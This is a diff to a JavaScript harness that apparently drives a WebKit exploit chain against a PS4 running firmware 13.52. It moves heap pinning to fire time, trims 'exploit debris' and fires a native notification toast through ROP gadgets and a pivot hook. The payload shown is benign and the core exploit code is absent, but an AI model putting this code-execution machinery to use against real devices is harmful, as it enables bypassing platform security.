@@ -87,10 +87,8 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     applyPivotHookForFire,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
-import { fireNotifyPinned, pinNotifyHeap } from "./slopkit_notify.js";
-
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830bo";
+const BUILD_ID = "rw-20250830bp";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid — hook cell+0x30 default (13.52; ?hook=cell for poops +0)" },
@@ -4321,9 +4319,10 @@ function resolveWebkitBase(off, nativeFn) {
     return null;
 }
 
-/** Pin collator+arena @ PRIMITIVE-OK — skip heavy expm1 slab in notify mode. */
-function ensureNotifyPrep(p, off) {
+/** Lazy pin @ Fire only — avoids OOM right after PRIMITIVE-OK. */
+async function ensureNotifyPrep(p, off) {
     if (notifyPrep) return notifyPrep;
+    const sk = await import("./slopkit_notify.js?v=" + BUILD_ID);
     let nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
     let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
     if (!nativeFn || !webkitBase) {
@@ -4337,7 +4336,7 @@ function ensureNotifyPrep(p, off) {
             return null;
         }
     }
-    notifyPrep = pinNotifyHeap({
+    notifyPrep = sk.pinNotifyHeap({
         p,
         off,
         leakval: p.leakval,
@@ -4350,7 +4349,7 @@ function ensureNotifyPrep(p, off) {
     });
     for (let i = 0; i < notifyRetain.length; i++)
         retained.push(notifyRetain[i]);
-    mark("NOTIFY-PREP", "pinned @ PRIMITIVE-OK — Accept fn then Fire notify");
+    mark("NOTIFY-PIN-OK", "lazy pin @ fire — Accept fn then retry if needed");
     return notifyPrep;
 }
 
@@ -5148,7 +5147,7 @@ function wireNativeBisectBar() {
     }
 }
 
-function runFireNotify() {
+async function runFireNotify() {
     if (busy) {
         mark("NOTIFY-SKIP", "busy");
         renderOut();
@@ -5180,21 +5179,32 @@ function runFireNotify() {
     nativeQuiet = true;
     mark("NOTIFY-FIRE", "Collator path build=" + BUILD_ID + " lk=" + lk);
     renderOut();
-
-    if (!notifyPrep) {
-        mark("NOTIFY-FAIL", "no pinned prep — close browser, reload ?v=20250830bo&freshprep=1, Start only");
-        state("Start first (need NOTIFY-PIN-OK)", "bad");
-        busy = false;
-        nativeQuiet = false;
-        setUi();
-        renderOut();
-        return;
-    }
+    try { crashLog.flushSync(); } catch (_) { }
 
     try {
+        try {
+            const coreMod = await import("./core.js");
+            coreMod.trimExploitDebris();
+            mark("NOTIFY-TRIM", "groom freed before pin");
+            renderOut();
+        } catch (_) { }
+
+        if (!notifyPrep) {
+            mark("NOTIFY-PIN", "lazy pin @ fire");
+            renderOut();
+            try { crashLog.flushSync(); } catch (_) { }
+            await ensureNotifyPrep(p, off);
+            if (!notifyPrep) {
+                mark("NOTIFY-FAIL", "pin failed — try index_notify.html (lite)");
+                state("pin failed", "bad");
+                return;
+            }
+        }
+
+        const sk = await import("./slopkit_notify.js?v=" + BUILD_ID);
         mark("NOTIFY-BEGIN", "pinned fire — 0 stage alloc");
         renderOut();
-        const out = fireNotifyPinned(p, notifyPrep, lk, off, mark);
+        const out = sk.fireNotifyPinned(p, notifyPrep, lk, off, mark);
         if (out.sent) {
             mark("NOTIFY-OK", "system toast result=0 build=" + BUILD_ID);
             state("notification sent — check PS4 toast", "ok");
@@ -5212,7 +5222,7 @@ function runFireNotify() {
     } catch (err) {
         const em = err && err.message ? err.message : String(err);
         mark("NOTIFY-FAIL", em + " build=" + BUILD_ID);
-        mark("NOTIFY-HINT", "RE gd on 13.52 — ?gd=0x… or ?gdscan=1 to hunt (OOM risk)");
+        mark("NOTIFY-HINT", "OOM? use index_notify.html — RE gd ?gd=0x…");
         state("notify failed: " + em.slice(0, 60), "bad");
         try {
             crashLog.append("NOTIFY-FAIL " + em, "NOTIFY-FAIL");
@@ -5539,8 +5549,7 @@ async function runStart() {
         const nm = getNativeMode();
         try {
             if (nm === "notify" && params.get("prepslab") !== "1") {
-                ensureNotifyPrep(p, off);
-                mark("NATIVE-HINT", "notify mode — no expm1 slab (use ?prepslab=1 for bisect)");
+                mark("NATIVE-HINT", "notify — pin @ Fire only; OOM? use index_notify.html");
             } else {
                 ensureNativePrep(p, off);
                 mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + nm);
